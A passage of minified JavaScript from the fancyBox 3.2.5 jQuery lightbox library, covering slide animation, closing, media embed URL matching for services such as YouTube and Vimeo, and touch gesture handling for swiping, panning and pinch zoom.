                var e, o, r, s, a, l = this,
                    c = t.$slide,
                    u = !1;
                return e = t.opts[l.firstRun ? "animationEffect" : "transitionEffect"], r = t.opts[l.firstRun ? "animationDuration" : "transitionDuration"], r = parseInt(t.forcedDuration === i ? r : t.forcedDuration, 10), !t.isMoved && t.pos === l.currPos && r || (e = !1), "zoom" !== e || t.pos === l.currPos && r && "image" === t.type && !t.hasError && (u = l.getThumbPos(t)) || (e = "fade"), "zoom" === e ? ((a = l.getFitPos(t)).scaleX = a.width / u.width, a.scaleY = a.height / u.height, delete a.width, delete a.height, "auto" == (s = t.opts.zoomOpacity) && (s = Math.abs(t.width / t.height - u.width / u.height) > .1), s && (u.opacity = .1, a.opacity = 1), n.fancybox.setTranslate(t.$content.removeClass("fancybox-is-hidden"), u), p(t.$content), void n.fancybox.animate(t.$content, a, r, (function() {
                    l.complete()
                }))) : (l.updateSlide(t), e ? (n.fancybox.stop(c), o = "fancybox-animated fancybox-slide--" + (t.pos >= l.prevPos ? "next" : "previous") + " fancybox-fx-" + e, c.removeAttr("style").removeClass("fancybox-slide--current fancybox-slide--next fancybox-slide--previous").addClass(o), t.$content.removeClass("fancybox-is-hidden"), p(c), void n.fancybox.animate(c, "fancybox-slide--current", r, (function(e) {
                    c.removeClass(o).removeAttr("style"), t.pos === l.currPos && l.complete()
                }), !0)) : (p(c), t.$content.removeClass("fancybox-is-hidden"), void(t.pos === l.currPos && l.complete())))
            },
            getThumbPos: function(i) {
                var o, r = !1,
                    s = i.opts.$thumb,
                    a = s ? s.offset() : 0;
                return a && s[0].ownerDocument === e && function(e) {
                    for (var i = e[0], o = i.getBoundingClientRect(), r = []; null !== i.parentElement;) "hidden" !== n(i.parentElement).css("overflow") && "auto" !== n(i.parentElement).css("overflow") || r.push(i.parentElement.getBoundingClientRect()), i = i.parentElement;
                    return r.every((function(t) {
                        var e = Math.min(o.right, t.right) - Math.max(o.left, t.left),
                            n = Math.min(o.bottom, t.bottom) - Math.max(o.top, t.top);
                        return e > 0 && n > 0
                    })) && o.bottom > 0 && o.right > 0 && o.left < n(t).width() && o.top < n(t).height()
                }(s) && (o = this.$refs.stage.offset(), r = {
                    top: a.top - o.top + parseFloat(s.css("border-top-width") || 0),
                    left: a.left - o.left + parseFloat(s.css("border-left-width") || 0),
                    width: s.width(),
                    height: s.height(),
                    scaleX: 1,
                    scaleY: 1
                }), r
            },
            complete: function() {
                var t = this,
                    i = t.current,
                    o = {};
                i.isMoved || !i.isLoaded || i.isComplete || (i.isComplete = !0, i.$slide.siblings().trigger("onReset"), p(i.$slide), i.$slide.addClass("fancybox-slide--complete"), n.each(t.slides, (function(e, i) {
                    i.pos >= t.currPos - 1 && i.pos <= t.currPos + 1 ? o[i.pos] = i : i && (n.fancybox.stop(i.$slide), i.$slide.off().remove())
                })), t.slides = o, t.updateCursor(), t.trigger("afterShow"), (n(e.activeElement).is("[disabled]") || i.opts.autoFocus && "image" != i.type && "iframe" !== i.type) && t.focus())
            },
            preload: function() {
                var t, e, n = this;
                n.group.length < 2 || (t = n.slides[n.currPos + 1], e = n.slides[n.currPos - 1], t && "image" === t.type && n.loadSlide(t), e && "image" === e.type && n.loadSlide(e))
            },
            focus: function() {
                var t, e = this.current;
                this.isClosing || (e && e.isComplete && ((t = e.$slide.find("input[autofocus]:enabled:visible:first")).length || (t = e.$slide.find("button,:input,[tabindex],a").filter(":enabled:visible:first"))), (t = t && t.length ? t : this.$refs.container).focus())
            },
            activate: function() {
                var t = this;
                n(".fancybox-container").each((function() {
                    var e = n(this).data("FancyBox");
                    e && e.id !== t.id && !e.isClosing && (e.trigger("onDeactivate"), e.removeEvents(), e.isVisible = !1)
                })), t.isVisible = !0, (t.current || t.isIdle) && (t.update(), t.updateControls()), t.trigger("onActivate"), t.addEvents()
            },
            close: function(t, e) {
                var i, o, r, s, a, l, h = this,
                    d = h.current,
                    f = function() {
                        h.cleanUp(t)
                    };
                return !(h.isClosing || (h.isClosing = !0, !1 === h.trigger("beforeClose", t) ? (h.isClosing = !1, c((function() {
                    h.update()
                })), 1) : (h.removeEvents(), d.timouts && clearTimeout(d.timouts), r = d.$content, i = d.opts.animationEffect, o = n.isNumeric(e) ? e : i ? d.opts.animationDuration : 0, d.$slide.off(u).removeClass("fancybox-slide--complete fancybox-slide--next fancybox-slide--previous fancybox-animated"), d.$slide.siblings().trigger("onReset").remove(), o && h.$refs.container.removeClass("fancybox-is-open").addClass("fancybox-is-closing"), h.hideLoading(d), h.hideControls(), h.updateCursor(), "zoom" !== i || !0 !== t && r && o && "image" === d.type && !d.hasError && (l = h.getThumbPos(d)) || (i = "fade"), "zoom" === i ? (n.fancybox.stop(r), a = n.fancybox.getTranslate(r), a.width = a.width * a.scaleX, a.height = a.height * a.scaleY, s = d.opts.zoomOpacity, "auto" == s && (s = Math.abs(d.width / d.height - l.width / l.height) > .1), s && (l.opacity = 0), a.scaleX = a.width / l.width, a.scaleY = a.height / l.height, a.width = l.width, a.height = l.height, n.fancybox.setTranslate(d.$content, a), p(d.$content), n.fancybox.animate(d.$content, l, o, f), 0) : (i && o ? !0 === t ? setTimeout(f, o) : n.fancybox.animate(d.$slide.removeClass("fancybox-slide--current"), "fancybox-animated fancybox-slide--previous fancybox-fx-" + i, o, f) : f(), 0))))
            },
            cleanUp: function(t) {
                var i, o, r = this,
                    a = n("body");
                r.current.$slide.trigger("onReset"), r.$refs.container.empty().remove(), r.trigger("afterClose", t), r.$lastFocus && r.current.opts.backFocus && r.$lastFocus.focus(), r.current = null, (i = n.fancybox.getInstance()) ? i.activate() : (s.scrollTop(r.scrollTop).scrollLeft(r.scrollLeft), a.removeClass("fancybox-active compensate-for-scrollbar"), a.hasClass("fancybox-iosfix") && (o = parseInt(e.body.style.top, 10), a.removeClass("fancybox-iosfix").css("top", "").scrollTop(-1 * o)), n("#fancybox-style-noscroll").remove())
            },
            trigger: function(t, e) {
                var i, o = Array.prototype.slice.call(arguments, 1),
                    r = this,
                    s = e && e.opts ? e : r.current;
                return s ? o.unshift(s) : s = r, o.unshift(r), n.isFunction(s.opts[t]) && (i = s.opts[t].apply(s, o)), !1 === i ? i : void("afterClose" !== t && r.$refs ? r.$refs.container.trigger(t + ".fb", o) : a.trigger(t + ".fb", o))
            },
            updateControls: function(t) {
                var e = this,
                    n = e.current,
                    i = n.index,
                    o = n.opts.caption,
                    r = e.$refs.container,
                    s = e.$refs.caption;
                n.$slide.trigger("refresh"), e.$caption = o && o.length ? s.html(o) : null, e.isHiddenControls || e.isIdle || e.showControls(), r.find("[data-fancybox-count]").html(e.group.length), r.find("[data-fancybox-index]").html(i + 1), r.find("[data-fancybox-prev]").prop("disabled", !n.opts.loop && i <= 0), r.find("[data-fancybox-next]").prop("disabled", !n.opts.loop && i >= e.group.length - 1), "image" === n.type ? r.find("[data-fancybox-download]").attr("href", n.opts.image.src || n.src).show() : r.find("[data-fancybox-download],[data-fancybox-zoom]").hide()
            },
            hideControls: function() {
                this.isHiddenControls = !0, this.$refs.container.removeClass("fancybox-show-infobar fancybox-show-toolbar fancybox-show-caption fancybox-show-nav")
            },
            showControls: function() {
                var t = this,
                    e = t.current ? t.current.opts : t.opts,
                    n = t.$refs.container;
                t.isHiddenControls = !1, t.idleSecondsCounter = 0, n.toggleClass("fancybox-show-toolbar", !(!e.toolbar || !e.buttons)).toggleClass("fancybox-show-infobar", !!(e.infobar && t.group.length > 1)).toggleClass("fancybox-show-nav", !!(e.arrows && t.group.length > 1)).toggleClass("fancybox-is-modal", !!e.modal), t.$caption ? n.addClass("fancybox-show-caption ") : n.removeClass("fancybox-show-caption")
            },
            toggleControls: function() {
                this.isHiddenControls ? this.showControls() : this.hideControls()
            }
        }), n.fancybox = {
            version: "3.2.5",
            defaults: r,
            getInstance: function(t) {
                var e = n('.fancybox-container:not(".fancybox-is-closing"):last').data("FancyBox"),
                    i = Array.prototype.slice.call(arguments, 1);
                return e instanceof h && ("string" === n.type(t) ? e[t].apply(e, i) : "function" === n.type(t) && t.apply(e, i), e)
            },
            open: function(t, e, n) {
                return new h(t, e, n)
            },
            close: function(t) {
                var e = this.getInstance();
                e && (e.close(), !0 === t && this.close())
            },
            destroy: function() {
                this.close(!0), a.off("click.fb-start")
            },
            isMobile: e.createTouch !== i && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
            use3d: function() {
                var n = e.createElement("div");
                return t.getComputedStyle && t.getComputedStyle(n).getPropertyValue("transform") && !(e.documentMode && e.documentMode < 11)
            }(),
            getTranslate: function(t) {
                var e;
                if (!t || !t.length) return !1;
                if ((e = t.eq(0).css("transform")) && -1 !== e.indexOf("matrix") ? e = (e = (e = e.split("(")[1]).split(")")[0]).split(",") : e = [], e.length) e = (e = e.length > 10 ? [e[13], e[12], e[0], e[5]] : [e[5], e[4], e[0], e[3]]).map(parseFloat);
                else {
                    e = [0, 0, 1, 1];
                    var n = /\.*translate\((.*)px,(.*)px\)/i.exec(t.eq(0).attr("style"));
                    n && (e[0] = parseFloat(n[2]), e[1] = parseFloat(n[1]))
                }
                return {
                    top: e[0],
                    left: e[1],
                    scaleX: e[2],
                    scaleY: e[3],
                    opacity: parseFloat(t.css("opacity")),
                    width: t.width(),
                    height: t.height()
                }
            },
            setTranslate: function(t, e) {
                var n = "",
                    o = {};
                if (t && e) return e.left === i && e.top === i || (n = (e.left === i ? t.position().left : e.left) + "px, " + (e.top === i ? t.position().top : e.top) + "px", n = this.use3d ? "translate3d(" + n + ", 0px)" : "translate(" + n + ")"), e.scaleX !== i && e.scaleY !== i && (n = (n.length ? n + " " : "") + "scale(" + e.scaleX + ", " + e.scaleY + ")"), n.length && (o.transform = n), e.opacity !== i && (o.opacity = e.opacity), e.width !== i && (o.width = e.width), e.height !== i && (o.height = e.height), t.css(o)
            },
            animate: function(t, e, o, r, s) {
                n.isFunction(o) && (r = o, o = null), n.isPlainObject(e) || t.removeAttr("style"), t.on(u, (function(o) {
                    (!o || !o.originalEvent || t.is(o.originalEvent.target) && "z-index" != o.originalEvent.propertyName) && (n.fancybox.stop(t), n.isPlainObject(e) ? e.scaleX !== i && e.scaleY !== i && (t.css("transition-duration", ""), e.width = Math.round(t.width() * e.scaleX), e.height = Math.round(t.height() * e.scaleY), e.scaleX = 1, e.scaleY = 1, n.fancybox.setTranslate(t, e)) : !0 !== s && t.removeClass(e), n.isFunction(r) && r(o))
                })), n.isNumeric(o) && t.css("transition-duration", o + "ms"), n.isPlainObject(e) ? n.fancybox.setTranslate(t, e) : t.addClass(e), e.scaleX && t.hasClass("fancybox-image-wrap") && t.parent().addClass("fancybox-is-scaling"), t.data("timer", setTimeout((function() {
                    t.trigger("transitionend")
                }), o + 16))
            },
            stop: function(t) {
                clearTimeout(t.data("timer")), t.off("transitionend").css("transition-duration", ""), t.hasClass("fancybox-image-wrap") && t.parent().removeClass("fancybox-is-scaling")
            }
        }, n.fn.fancybox = function(t) {
            var e;
            return (e = (t = t || {}).selector || !1) ? n("body").off("click.fb-start", e).on("click.fb-start", e, {
                options: t
            }, o) : this.off("click.fb-start").on("click.fb-start", {
                items: this,
                options: t
            }, o), this
        }, a.on("click.fb-start", "[data-fancybox]", o)
    }
}(window, document, window.jQuery || jQuery),
function(t) {
    "use strict";
    var e = function(e, n, i) {
            if (e) return i = i || "", "object" === t.type(i) && (i = t.param(i, !0)), t.each(n, (function(t, n) {
                e = e.replace("$" + t, n || "")
            })), i.length && (e += (e.indexOf("?") > 0 ? "&" : "?") + i), e
        },
        n = {
            youtube: {
                matcher: /(youtube\.com|youtu\.be|youtube\-nocookie\.com)\/(watch\?(.*&)?v=|v\/|u\/|embed\/?)?(videoseries\?list=(.*)|[\w-]{11}|\?listType=(.*)&list=(.*))(.*)/i,
                params: {
                    autoplay: 1,
                    autohide: 1,
                    fs: 1,
                    rel: 0,
                    hd: 1,
                    wmode: "transparent",
                    enablejsapi: 1,
                    html5: 1
                },
                paramPlace: 8,
                type: "iframe",
                url: "//www.youtube.com/embed/$4",
                thumb: "//img.youtube.com/vi/$4/hqdefault.jpg"
            },
            vimeo: {
                matcher: /^.+vimeo.com\/(.*\/)?([\d]+)(.*)?/,
                params: {
                    autoplay: 1,
                    hd: 1,
                    show_title: 1,
                    show_byline: 1,
                    show_portrait: 0,
                    fullscreen: 1,
                    api: 1
                },
                paramPlace: 3,
                type: "iframe",
                url: "//player.vimeo.com/video/$2"
            },
            metacafe: {
                matcher: /metacafe.com\/watch\/(\d+)\/(.*)?/,
                type: "iframe",
                url: "//www.metacafe.com/embed/$1/?ap=1"
            },
            dailymotion: {
                matcher: /dailymotion.com\/video\/(.*)\/?(.*)/,
                params: {
                    additionalInfos: 0,
                    autoStart: 1
                },
                type: "iframe",
                url: "//www.dailymotion.com/embed/video/$1"
            },
            vine: {
                matcher: /vine.co\/v\/([a-zA-Z0-9\?\=\-]+)/,
                type: "iframe",
                url: "//vine.co/v/$1/embed/simple"
            },
            instagram: {
                matcher: /(instagr\.am|instagram\.com)\/p\/([a-zA-Z0-9_\-]+)\/?/i,
                type: "image",
                url: "//$1/p/$2/media/?size=l"
            },
            gmap_place: {
                matcher: /(maps\.)?google\.([a-z]{2,3}(\.[a-z]{2})?)\/(((maps\/(place\/(.*)\/)?\@(.*),(\d+.?\d+?)z))|(\?ll=))(.*)?/i,
                type: "iframe",
                url: function(t) {
                    return "//maps.google." + t[2] + "/?ll=" + (t[9] ? t[9] + "&z=" + Math.floor(t[10]) + (t[12] ? t[12].replace(/^\//, "&") : "") : t[12]) + "&output=" + (t[12] && t[12].indexOf("layer=c") > 0 ? "svembed" : "embed")
                }
            },
            gmap_search: {
                matcher: /(maps\.)?google\.([a-z]{2,3}(\.[a-z]{2})?)\/(maps\/search\/)(.*)/i,
                type: "iframe",
                url: function(t) {
                    return "//maps.google." + t[2] + "/maps?q=" + t[5].replace("query=", "q=").replace("api=1", "") + "&output=embed"
                }
            }
        };
    t(document).on("objectNeedsType.fb", (function(i, o, r) {
        var s, a, l, c, u, p, h, d = r.src || "",
            f = !1;
        s = t.extend(!0, {}, n, r.opts.media), t.each(s, (function(n, i) {
            if (l = d.match(i.matcher)) {
                if (f = i.type, p = {}, i.paramPlace && l[i.paramPlace]) {
                    "?" == (u = l[i.paramPlace])[0] && (u = u.substring(1)), u = u.split("&");
                    for (var o = 0; o < u.length; ++o) {
                        var s = u[o].split("=", 2);
                        2 == s.length && (p[s[0]] = decodeURIComponent(s[1].replace(/\+/g, " ")))
                    }
                }
                return c = t.extend(!0, {}, i.params, r.opts[n], p), d = "function" === t.type(i.url) ? i.url.call(this, l, c, r) : e(i.url, l, c), a = "function" === t.type(i.thumb) ? i.thumb.call(this, l, c, r) : e(i.thumb, l), "vimeo" === n && (d = d.replace("&%23", "#")), !1
            }
        })), f ? (r.src = d, r.type = f, r.opts.thumb || r.opts.$thumb && r.opts.$thumb.length || (r.opts.thumb = a), "iframe" === f && (t.extend(!0, r.opts, {
            iframe: {
                preload: !1,
                attr: {
                    scrolling: "no"
                }
            }
        }), r.contentProvider = h, r.opts.slideClass += " fancybox-slide--video")) : d && (r.type = r.opts.defaultType)
    }))
}(window.jQuery || jQuery),
function(t, e, n) {
    "use strict";
    var i = t.requestAnimationFrame || t.webkitRequestAnimationFrame || t.mozRequestAnimationFrame || t.oRequestAnimationFrame || function(e) {
            return t.setTimeout(e, 1e3 / 60)
        },
        o = t.cancelAnimationFrame || t.webkitCancelAnimationFrame || t.mozCancelAnimationFrame || t.oCancelAnimationFrame || function(e) {
            t.clearTimeout(e)
        },
        r = function(e) {
            var n = [];
            for (var i in e = (e = e.originalEvent || e || t.e).touches && e.touches.length ? e.touches : e.changedTouches && e.changedTouches.length ? e.changedTouches : [e]) e[i].pageX ? n.push({
                x: e[i].pageX,
                y: e[i].pageY
            }) : e[i].clientX && n.push({
                x: e[i].clientX,
                y: e[i].clientY
            });
            return n
        },
        s = function(t, e, n) {
            return e && t ? "x" === n ? t.x - e.x : "y" === n ? t.y - e.y : Math.sqrt(Math.pow(t.x - e.x, 2) + Math.pow(t.y - e.y, 2)) : 0
        },
        a = function(t) {
            if (t.is('a,area,button,[role="button"],input,label,select,summary,textarea') || n.isFunction(t.get(0).onclick) || t.data("selectable")) return !0;
            for (var e = 0, i = t[0].attributes, o = i.length; e < o; e++)
                if ("data-fancybox-" === i[e].nodeName.substr(0, 14)) return !0;
            return !1
        },
        l = function(e) {
            var n = t.getComputedStyle(e)["overflow-y"],
                i = t.getComputedStyle(e)["overflow-x"],
                o = ("scroll" === n || "auto" === n) && e.scrollHeight > e.clientHeight,
                r = ("scroll" === i || "auto" === i) && e.scrollWidth > e.clientWidth;
            return o || r
        },
        c = function(t) {
            for (var e = !1; !(e = l(t.get(0))) && ((t = t.parent()).length && !t.hasClass("fancybox-stage") && !t.is("body")););
            return e
        },
        u = function(t) {
            var e = this;
            e.instance = t, e.$bg = t.$refs.bg, e.$stage = t.$refs.stage, e.$container = t.$refs.container, e.destroy(), e.$container.on("touchstart.fb.touch mousedown.fb.touch", n.proxy(e, "ontouchstart"))
        };
    u.prototype.destroy = function() {
        this.$container.off(".fb.touch")
    }, u.prototype.ontouchstart = function(i) {
        var o = this,
            l = n(i.target),
            u = o.instance,
            p = u.current,
            h = p.$content,
            d = "touchstart" == i.type;
        if (d && o.$container.off("mousedown.fb.touch"), !p || o.instance.isAnimating || o.instance.isClosing) return i.stopPropagation(), void i.preventDefault();
        if ((!i.originalEvent || 2 != i.originalEvent.button) && l.length && !a(l) && !a(l.parent()) && !(i.originalEvent.clientX > l[0].clientWidth + l.offset().left) && (o.startPoints = r(i), o.startPoints && !(o.startPoints.length > 1 && u.isSliding))) {
            if (o.$target = l, o.$content = h, o.canTap = !0, o.opts = p.opts.touch, n(e).off(".fb.touch"), n(e).on(d ? "touchend.fb.touch touchcancel.fb.touch" : "mouseup.fb.touch mouseleave.fb.touch", n.proxy(o, "ontouchend")), n(e).on(d ? "touchmove.fb.touch" : "mousemove.fb.touch", n.proxy(o, "ontouchmove")), !o.opts && !u.canPan() || !l.is(o.$stage) && !o.$stage.find(l).length) return void(l.is("img") && i.preventDefault());
            i.stopPropagation(), n.fancybox.isMobile && (c(o.$target) || c(o.$target.parent())) || i.preventDefault(), o.canvasWidth = Math.round(p.$slide[0].clientWidth), o.canvasHeight = Math.round(p.$slide[0].clientHeight), o.startTime = (new Date).getTime(), o.distanceX = o.distanceY = o.distance = 0, o.isPanning = !1, o.isSwiping = !1, o.isZooming = !1, o.sliderStartPos = o.sliderLastPos || {
                top: 0,
                left: 0
            }, o.contentStartPos = n.fancybox.getTranslate(o.$content), o.contentLastPos = null, 1 !== o.startPoints.length || o.isZooming || (o.canTap = !u.isSliding, "image" === p.type && (o.contentStartPos.width > o.canvasWidth + 1 || o.contentStartPos.height > o.canvasHeight + 1) ? (n.fancybox.stop(o.$content), o.$content.css("transition-duration", "0ms"), o.isPanning = !0) : o.isSwiping = !0, o.$container.addClass("fancybox-controls--isGrabbing")), 2 !== o.startPoints.length || u.isAnimating || p.hasError || "image" !== p.type || !p.isLoaded && !p.$ghost || (o.isZooming = !0, o.isSwiping = !1, o.isPanning = !1, n.fancybox.stop(o.$content), o.$content.css("transition-duration", "0ms"), o.centerPointStartX = .5 * (o.startPoints[0].x + o.startPoints[1].x) - n(t).scrollLeft(), o.centerPointStartY = .5 * (o.startPoints[0].y + o.startPoints[1].y) - n(t).scrollTop(), o.percentageOfImageAtPinchPointX = (o.centerPointStartX - o.contentStartPos.left) / o.contentStartPos.width, o.percentageOfImageAtPinchPointY = (o.centerPointStartY - o.contentStartPos.top) / o.contentStartPos.height, o.startDistanceBetweenFingers = s(o.startPoints[0], o.startPoints[1]))
        }
    }, u.prototype.ontouchmove = function(t) {
        var e = this;
        if (e.newPoints = r(t), n.fancybox.isMobile && (c(e.$target) || c(e.$target.parent()))) return t.stopPropagation(), void(e.canTap = !1);
        if ((e.opts || e.instance.canPan()) && e.newPoints && e.newPoints.length && (e.distanceX = s(e.newPoints[0], e.startPoints[0], "x"), e.distanceY = s(e.newPoints[0], e.startPoints[0], "y"), e.distance = s(e.newPoints[0], e.startPoints[0]), e.distance > 0)) {
            if (!e.$target.is(e.$stage) && !e.$stage.find(e.$target).length) return;
            t.stopPropagation(), t.preventDefault(), e.isSwiping ? e.onSwipe() : e.isPanning ? e.onPan() : e.isZooming && e.onZoom()
        }
    }, u.prototype.onSwipe = function() {
        var e, r = this,
            s = r.isSwiping,
            a = r.sliderStartPos.left || 0;
        !0 === s ? Math.abs(r.distance) > 10 && (r.canTap = !1, r.instance.group.length < 2 && r.opts.vertical ? r.isSwiping = "y" : r.instance.isSliding || !1 === r.opts.vertical || "auto" === r.opts.vertical && n(t).width() > 800 ? r.isSwiping = "x" : (e = Math.abs(180 * Math.atan2(r.distanceY, r.distanceX) / Math.PI), r.isSwiping = e > 45 && e < 135 ? "y" : "x"), r.instance.isSliding = r.isSwiping, r.startPoints = r.newPoints, n.each(r.instance.slides, (function(t, e) {
            n.fancybox.stop(e.$slide), e.$slide.css("transition-duration", "0ms"), e.inTransition = !1, e.pos === r.instance.current.pos && (r.sliderStartPos.left = n.fancybox.getTranslate(e.$slide).left)
        })), r.instance.SlideShow && r.instance.SlideShow.isActive && r.instance.SlideShow.stop()) : ("x" == s && (r.distanceX > 0 && (r.instance.group.length < 2 || 0 === r.instance.current.index && !r.instance.current.opts.loop) ? a += Math.pow(r.distanceX, .8) : r.distanceX < 0 && (r.instance.group.length < 2 || r.instance.current.index === r.instance.group.length - 1 && !r.instance.current.opts.loop) ? a -= Math.pow(-r.distanceX, .8) : a += r.distanceX), r.sliderLastPos = {
            top: "x" == s ? 0 : r.sliderStartPos.top + r.distanceY,
            left: a
        }, r.requestId && (o(r.requestId), r.requestId = null), r.requestId = i((function() {
            r.sliderLastPos && (n.each(r.instance.slides, (function(t, e) {
                var i = e.pos - r.instance.currPos;
                n.fancybox.setTranslate(e.$slide, {
                    top: r.sliderLastPos.top,
                    left: r.sliderLastPos.left + i * r.canvasWidth + i * e.opts.gutter
                })
            })), r.$container.addClass("fancybox-is-sliding"))
        })))
    }, u.prototype.onPan = function() {
        var t, e, r, s = this;
        s.canTap = !1, t = s.contentStartPos.width > s.canvasWidth ? s.contentStartPos.left + s.distanceX : s.contentStartPos.left, e = s.contentStartPos.top + s.distanceY, (r = s.limitMovement(t, e, s.contentStartPos.width, s.contentStartPos.height)).scaleX = s.contentStartPos.scaleX, r.scaleY = s.contentStartPos.scaleY, s.contentLastPos = r, s.requestId && (o(s.requestId), s.requestId = null), s.requestId = i((function() {
            n.fancybox.setTranslate(s.$content, s.contentLastPos)
        }))
    }, u.prototype.limitMovement = function(t, e, n, i) {
        var o, r, s, a, l = this,
            c = l.canvasWidth,
            u = l.canvasHeight,
            p = l.contentStartPos.left,
            h = l.contentStartPos.top,
            d = l.distanceX,
            f = l.distanceY;
        return o = Math.max(0, .5 * c - .5 * n), r = Math.max(0, .5 * u - .5 * i), s = Math.min(c - n, .5 * c - .5 * n), a = Math.min(u - i, .5 * u - .5 * i), n > c && (d > 0 && t > o && (t = o - 1 + Math.pow(-o + p + d, .8) || 0), d < 0 && t < s && (t = s + 1 - Math.pow(s - p - d, .8) || 0)), i > u && (f > 0 && e > r && (e = r - 1 + Math.pow(-r + h + f, .8) || 0), f < 0 && e < a && (e = a + 1 - Math.pow(a - h - f, .8) || 0)), {
            top: e,
            left: t
        }
    }, u.prototype.limitPosition = function(t, e, n, i) {
        var o = this.canvasWidth,
            r = this.canvasHeight;
        return n > o ? t = (t = t > 0 ? 0 : t) < o - n ? o - n : t : t = Math.max(0, o / 2 - n / 2), i > r ? e = (e = e > 0 ? 0 : e) < r - i ? r - i : e : e = Math.max(0, r / 2 - i / 2), {
            top: e,
            left: t
        }
    }, u.prototype.onZoom = function() {
        var e = this,
            r = e.contentStartPos.width,
            a = e.contentStartPos.height,
            l = e.contentStartPos.left,
            c = e.contentStartPos.top,
            u = s(e.newPoints[0], e.newPoints[1]) / e.startDistanceBetweenFingers,
            p = Math.floor(r * u),
            h = Math.floor(a * u),
            d = (r - p) * e.percentageOfImageAtPinchPointX,
            f = (a - h) * e.percentageOfImageAtPinchPointY,
            m = (e.newPoints[0].x + e.newPoints[1].x) / 2 - n(t).scrollLeft(),
            g = (e.newPoints[0].y + e.newPoints[1].y) / 2 - n(t).scrollTop(),
            v = m - e.centerPointStartX,
            y = {
                top: c + (f + (g - e.centerPointStartY)),
                left: l + (d + v),
                scaleX: e.contentStartPos.scaleX * u,
                scaleY: e.contentStartPos.scaleY * u
            };
        e.canTap = !1, e.newWidth = p, e.newHeight = h, e.contentLastPos = y, e.requestId && (o(e.requestId), e.requestId = null), e.requestId = i((function() {
            n.fancybox.setTranslate(e.$content, e.contentLastPos)
        }))
    }, u.prototype.ontouchend = function(t) {
        var i = this,
            s = Math.max((new Date).getTime() - i.startTime, 1),
            a = i.isSwiping,
            l = i.isPanning,
            c = i.isZooming;
        return i.endPoints = r(t), i.$container.removeClass("fancybox-controls--isGrabbing"), n(e).off(".fb.touch"), i.requestId && (o(i.requestId), i.requestId = null), i.isSwiping = !1, i.isPanning = !1, i.isZooming = !1, i.canTap ? i.onTap(t) : (i.speed = 366, i.velocityX = i.distanceX / s * .5, i.velocityY = i.distanceY / s * .5, i.speedX = Math.max(.5 * i.speed, Math.min(1.5 * i.speed, 1 / Math.abs(i.velocityX) * i.speed)), void(l ? i.endPanning() : c ? i.endZooming() : i.endSwiping(a)))
    }, u.prototype.endSwiping = function(t) {
        var e = this,
            i = !1;
        e.instance.isSliding = !1, e.sliderLastPos = null, "y" == t && Math.abs(e.distanceY) > 50 ? (n.fancybox.animate(e.instance.current.$slide, {
            top: e.sliderStartPos.top + e.distanceY + 150 * e.velocityY,
            opacity: 0
        }, 150), i = e.instance.close(!0, 300)) : "x" == t && e.distanceX > 50 && e.instance.group.length > 1 ? i = e.instance.previous(e.speedX) : "x" == t && e.distanceX < -50 && e.instance.group.length > 1 && (i = e.instance.next(e.speedX)), !1 !== i || "x" != t && "y" != t || e.instance.jumpTo(e.instance.current.index, 150), e.$container.removeClass("fancybox-is-sliding")
    }, u.prototype.endPanning = function() {
        var t, e, i, o = this;
        o.contentLastPos && (!1 === o.opts.momentum ? (t = o.contentLastPos.left, e = o.contentLastPos.top) : (t = o.contentLastPos.left + o.velocityX * o.speed, e = o.contentLastPos.top + o.velocityY * o.speed), (i = o.limitPosition(t, e, o.contentStartPos.width, o.contentStartPos.height)).width = o.contentStartPos.width, i.height = o.contentStartPos.height, n.fancybox.animate(o.$content, i, 330))
    }, u.prototype.endZooming = function() {
        var t, e, i, o, r = this,
            s = r.instance.current,
            a = r.newWidth,
            l = r.newHeight;
        r.contentLastPos && (t = r.contentLastPos.left, o = {
            top: e = r.contentLastPos.top,
            left: t,
            width: a,
            height: l,
            scaleX: 1,
            scaleY: 1
        }, n.fancybox.setTranslate(r.$content, o), a < r.canvasWidth && l < r.canvasHeight ? r.instance.scaleToFit(150) : a > s.width || l > s.height ? r.instance.scaleToActual(r.centerPointStartX, r.centerPointStartY, 150) : (i = r.limitPosition(t, e, a, l), n.fancybox.setTranslate(r.content, n.fancybox.getTranslate(r.$content)), n.fancybox.animate(r.$content, i, 150)))
    }, u.prototype.onTap = function(t) {
        var e, i = this,
            o = n(t.target),
            s = i.instance,
            a = s.current,
            l = t && r(t) || i.startPoints,
            c = l[0] ? l[0].x - i.$stage.offset().left : 0,
            u = l[0] ? l[0].y - i.$stage.offset().top : 0,
            p = function(e) {
                var o = a.opts[e];
                if (n.isFunction(o) && (o = o.apply(s, [a, t])), o) switch (o) {
                    case "close":
                        s.close(i.startEvent);
                        break;
                    case "toggleControls":
                        s.toggleControls(!0);
                        break;
                    case "next":
                        s.next();
                        break;
                    case "nextOrClose":
                        s.group.length > 1 ? s.next() : s.close(i.startEvent);
                        break;
                    case "zoom":
                        "image" == a.type && (a.isLoaded || a.$ghost) && (s.canPan() ? s.scaleToFit() : s.isScaledDown() ? s.scaleToActual(c, u) : s.group.length < 2 && s.close(i.startEvent))
                }
            };
        if (!(t.originalEvent && 2 == t.originalEvent.button || s.isSliding || c > o[0].clientWidth + o.offset().left)) {
            if (o.is(".fancybox-bg,.fancybox-inner,.fancybox-outer,.fancybox-container")) e = "Outside";
            else if (o.is(".fancybox-slide")) e = "Slide";
            else {
                if (!s.current.$content || !s.current.$content.has(t.target).length) return;
                e = "Content"
            }
            if (i.tapped) {
                if (clearTimeout(i.tapped), i.tapped = null, Math.abs(c - i.tapX) > 50 || Math.abs(u - i.tapY) > 50 || s.isSliding) return this;
                p("dblclick" + e)
            } else i.tapX = c, i.tapY = u, a.opts["dblclick" + e] && a.opts["dblclick" + e] !== a.opts["click" + e] ? i.tapped = setTimeout((function() {
                i.tapped = null, p("click" + e)
            }), 300) : p("click" + e);
            return this
        }
    }, n(e).on("onActivate.fb", (function(t, e) {
        e && !e.Guestures && (e.Guestures = new u(e))
    })), n(e).on("beforeClose.fb", (function(t, e) {
        e && e.Guestures && e.Guestures.destroy()
    }))
}(window, document, window.jQuery || jQuery),
function(t, e) {
    "use strict";
    e.extend(!0, e.fancybox.defaults, {
        btnTpl: {
            slideShow: '<button data-fancybox-play class="fancybox-button fancybox-button--play" title="{{PLAY_START}}"><svg viewBox="0 0 40 40"><path d="M13,12 L27,20 L13,27 Z" /><path d="M15,10 v19 M23,10 v19" /></svg></button>'
        },
        slideShow: {
            autoStart: !1,
            speed: 3e3
        }
    });
    var n = function(t) {
        this.instance = t, this.init()
    };
    e.extend(n.prototype, {
        timer: null,
        isActive: !1,
        $button: null,
        init: function() {
            var t = this;
